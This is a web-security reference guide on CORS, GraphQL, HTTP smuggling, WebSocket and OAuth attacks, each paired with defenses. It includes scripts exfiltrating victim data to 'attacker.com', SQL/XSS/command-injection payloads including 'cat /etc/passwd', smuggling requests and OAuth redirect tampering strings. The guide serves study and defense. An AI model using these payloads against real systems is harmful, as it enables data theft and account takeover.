# Modern Web Protocol Security

> **Source**: distilled from the WooYun database, OWASP, and industry security practice, covering five modern web-protocol attack surfaces: CORS, GraphQL, HTTP smuggling, WebSocket, and OAuth.
> **Methodology**: WooYun vulnerability-essence formula + L1-L4 systematic analysis

---

## 1. CORS Misconfiguration

### 1.1 Nature of the Vulnerability

```
CORS risk = an overly broad Access-Control-Allow-Origin × sensitive endpoints lacking extra authentication
```

The browser same-origin policy is a security barrier; a CORS misconfiguration breaks it, allowing a malicious site to read a user's sensitive data cross-origin.

### 1.2 Detection Method

```bash
# Basic detection: send a custom Origin and observe the response
curl -H "Origin: https://evil.com" -I https://target.com/api/userinfo
# Check response headers:
# Access-Control-Allow-Origin: https://evil.com  → dangerous!
# Access-Control-Allow-Credentials: true          → cross-origin requests may carry cookies
```

**Dangerous Configuration Patterns**

| Pattern | risk | description |
|------|------|------|
| `Access-Control-Allow-Origin: *` | high | wildcard; any origin can read (but cannot send cookies) |
| Dynamic Origin reflection | very high | returns the request Origin directly as a response header |
| `null` Origin allowed | high | `<iframe sandbox>` can produce a null origin |
| Regex-match flaw | high | `evil.com.attacker.com` matches `evil.com` |
| Subdomain wildcard | medium | `*.target.com` includes an out-of-control subdomain |

### 1.3 Exploitation Methods

```html
<!-- malicious page: cross-origin theft of user data -->
<script>
fetch('https://target.com/api/userinfo', {credentials: 'include'})
  .then(r => r.json())
  .then(d => fetch('https://attacker.com/steal?data=' + JSON.stringify(d)));
</script>

<!-- null-Origin abuse -->
<iframe sandbox="allow-scripts allow-top-navigation" src="data:text/html,
<script>
fetch('https://target.com/api/userinfo',{credentials:'include'})
.then(r=>r.text()).then(d=>parent.postMessage(d,'*'))
</script>">
</iframe>
```

### 1.4 Defenses

- **Strict Origin whitelisting**: do not reflect dynamically; use an exact-match list
- Avoid using `Access-Control-Allow-Origin: *` together with `Access-Control-Allow-Credentials: true`
- Avoid allowing a `null` Origin
- Regex matches must be anchored (^ and $) to prevent substring-match bypass
- Add extra authentication like a CSRF token to sensitive endpoints; don't rely on CORS alone

---

## 2. GraphQL Security

### 2.1 Nature of the Vulnerability

```
GraphQL risk = powerful query capability × introspection open by default × lack of fine-grained authorization
```

A single GraphQL endpoint exposes the entire data model, and introspection provides full API documentation, so an attacker need not guess endpoints.

### 2.2 Introspection Query - Information Disclosure

```graphql
# Get the full schema (types, fields, arguments)
{__schema{types{name,fields{name,args{name,type{name}}}}}}

# Condensed version: only get the query types
{__schema{queryType{name,fields{name}}}}

# Get the mutation list
{__schema{mutationType{name,fields{name,args{name}}}}}
```

### 2.3 Common Attack Vectors

**Injection Attacks**

```graphql
# Parameter concatenation leads to SQL injection
{ user(name: "admin' OR '1'='1") { id email } }

# NoSQL injection
{ user(filter: "{\"username\": {\"$gt\": \"\"}}") { id email } }
```

**Batch-Query DoS (nested queries exhaust resources)**

```graphql
# Deep nesting - exponential database queries
{ user(id:1) { friends { friends { friends { friends { name } } } } } }

# Alias batch query - enumerate large amounts of data in a single request
{ a: user(id:1){name} b: user(id:2){name} c: user(id:3){name} ... }

# Batch-mutation brute force
mutation { login1: login(user:"admin",pass:"123"){token} login2: login(user:"admin",pass:"456"){token} }
```

**Authentication Bypass**

```graphql
# The mutation lacks an authorization check
mutation { deleteUser(id: 1) { success } }
mutation { updateRole(userId: 1, role: "admin") { success } }
```

### 2.4 Defenses

- **Disable introspection in production**: check for `__schema`/`__type` requests and reject them
- Query-depth limits (recommended max 10 levels) and complexity analysis
- Rate limiting and query timeouts (to prevent batch/nested DoS)
- Field-level authorization (each resolver authorizes independently)
- Parameterize inputs (to prevent injection); never build queries by string concatenation
- Use persisted queries; allow only pre-registered queries to run

---

## 3. HTTP Request Smuggling

### 3.1 Nature of the Vulnerability

```
The front-end proxy (CDN/LB) and the back-end server parse HTTP request boundaries inconsistently
→ an extra request is "smuggled" within one TCP connection → affects other users' request processing
```

Core tension: when both `Content-Length` (CL) and `Transfer-Encoding: chunked` (TE) are present, the front end and back end choose different headers to parse.

### 3.2 Three Attack Types

| Type | front-end parsing | back-end parsing | description |
|------|----------|----------|------|
| CL.TE | Content-Length | Transfer-Encoding | the front end forwards by CL, the back end parses by TE |
| TE.CL | Transfer-Encoding | Content-Length | the front end forwards by TE, the back end parses by CL |
| TE.TE | Transfer-Encoding | Transfer-Encoding | obfuscate the TE header so one side ignores it |

### 3.3 Classic Payloads

**CL.TE Smuggling**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**TE.CL Smuggling**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

**TE.TE Obfuscation Variants**

```http
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: identity
Transfer-Encoding:chunked
```

### 3.4 Detection and Exploitation

```
Detection method:
1. Send a CL/TE-conflicting request and observe timeouts / abnormal responses
2. Smuggle an incomplete request and see whether subsequent requests are affected
3. Tool: the Burp Suite HTTP Request Smuggler extension

Exploitation scenarios:
- Bypass the front-end WAF/ACL → smuggle a malicious request to the back end
- Hijack other users' requests → steal cookies/sessions
- Cache poisoning → a smuggled request pollutes the CDN cache content
- Request-routing hijack → direct requests to an arbitrary back end
```

### 3.5 Defenses

- Front end and back end use the same HTTP-parsing library/version
- Forbid CL and TE headers appearing together; reject ambiguous requests
- Disable HTTP/1.0 Keep-Alive back-end connection reuse
- Upgrade to HTTP/2 (a binary framing protocol, inherently immune to CL/TE ambiguity)
- The CDN/LB normalizes request headers before forwarding

---

## 4. WebSocket Security

### 4.1 Nature of the Vulnerability

```
WebSocket risk = leaving the traditional security model after the HTTP handshake × a persistent bidirectional channel lacking per-message authorization
```

Once a WebSocket connection is established, subsequent messages no longer pass through standard HTTP security mechanisms (cookie SameSite / CSRF token, etc.).

### 4.2 Cross-Site WebSocket Hijacking (CSWSH)

```html
<!-- malicious page: hijack the user's WebSocket connection -->
<script>
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() {
    ws.send('{"action":"getPrivateData"}');  // send the request as the victim
};
ws.onmessage = function(e) {
    // exfiltrate the response data
    fetch('https://attacker.com/steal?data=' + encodeURIComponent(e.data));
};
</script>
```

**Principle**: The WebSocket handshake is a standard HTTP request, and the browser automatically sends cookies. If the server does not validate the Origin header, a malicious page can establish an authenticated ws connection.

### 4.3 Message Injection

```javascript
// send the injection payload over WebSocket
ws.send('{"query": "admin\' OR 1=1--"}');          // SQL injection
ws.send('{"msg": "<img src=x onerror=alert(1)>"}'); // XSS
ws.send('{"cmd": "ls; cat /etc/passwd"}');           // command injection
```

### 4.4 Insufficient Authentication

| Issue | risk | description |
|------|------|------|
| Auth only at handshake | the connection stays valid after the session expires | a ws connection can last hours |
| No message-level authorization | any connected client can perform all operations | lacks per-message authorization checks |
| Plaintext token transmission | WebSocket unencrypted (ws://) | use wss:// to enforce encryption |

### 4.5 Defenses

- **Validate the Origin header**: check during the handshake that the Origin is whitelisted (prevents CSWSH)
- **Token auth**: pass the token via a URL parameter or the first message during the handshake (not via cookies)
- **Message validation**: perform input validation and output encoding on every message (to prevent injection)
- Use wss:// to enforce encrypted transport
- Implement heartbeats and automatic disconnect on session timeout
- Message rate limiting (to prevent DoS)

---

## 5. OAuth 2.0 / OIDC Security

### 5.1 Nature of the Vulnerability

```
OAuth risk = a complex multi-party flow × lax parameter validation × implementation deviating from the spec
```

The OAuth authorization flow involves three-party interaction among the client, authorization server, and resource server; misconfiguring any link can lead to token leakage or account takeover.

### 5.2 redirect_uri Manipulation

```
# Normal flow
https://auth.target.com/authorize?response_type=code&client_id=app&redirect_uri=https://app.com/callback

# Attack: tamper with redirect_uri to steal the authorization code
redirect_uri=https://attacker.com/steal           # full replacement
redirect_uri=https://app.com.attacker.com/callback # subdomain confusion
redirect_uri=https://app.com/callback/../../../attacker # path traversal
redirect_uri=https://app.com/callback?next=https://attacker.com # open-redirect chain
```

### 5.3 Common Attack Vectors

| Attack type | principle | exploitation condition |
|----------|------|----------|
| CSRF attack | the state parameter is missing or predictable | bind the attacker's account to the victim |
| Token leak (Referer) | the implicit-flow token is in the URL fragment | the page references external resources |
| Token leak (logs) | the authorization code/token is recorded in server logs | logs are accessible |
| PKCE bypass | a public client does not use code_challenge | intercepting the authorization code is enough to exchange for a token |
| IdP Mix-Up | confuse the source of the authorization response in a multi-IdP scenario | the client supports multiple OAuth providers |
| Authorization-code replay | the authorization code is not single-use | intercept it and redeem it repeatedly |

### 5.4 CSRF and the state Parameter

```
# Attack flow (when state is missing)
1. The attacker initiates OAuth authorization and obtains the authorization code for their own account
2. Build the link: https://app.com/callback?code=ATTACKER_CODE
3. Trick the victim into clicking → the victim's account is bound to the attacker's third-party account
4. The attacker logs in with the third-party account → takes over the victim's account

# Defense: the state parameter
state=<random unpredictable value> (bound to the user's session)
→ on callback, verify that state matches the session
```

### 5.5 Implicit-Flow Risks

```
# Implicit Flow - no longer recommended
https://app.com/callback#access_token=eyJ...&token_type=bearer

Risks:
- The token is in the URL fragment and can leak via browser history / the Referer header
- Cannot use a refresh_token, giving a poor user experience
- Cannot bind the client identity (no client_secret)

→ alternative: Authorization Code Flow + PKCE
```

### 5.6 Defenses

- **Strict redirect_uri whitelist**: exact matching (no wildcards / sub-paths)
- **Enforce the state parameter**: bind it to the session, make it unpredictable and single-use
- **Enforce PKCE**: all clients (especially public clients / SPAs) must use code_challenge
- Use the Authorization Code Flow; deprecate the Implicit Flow
- Authorization codes are single-use with a short lifetime (recommended: within 10 minutes)
- Token binding (DPoP/mTLS) prevents token theft
- Periodically audit authorized third-party apps and their permission scopes

---

*Distilled from the WooYun vulnerability database (88,636 entries) + OWASP/RFC security standards | For security research and defense reference only*
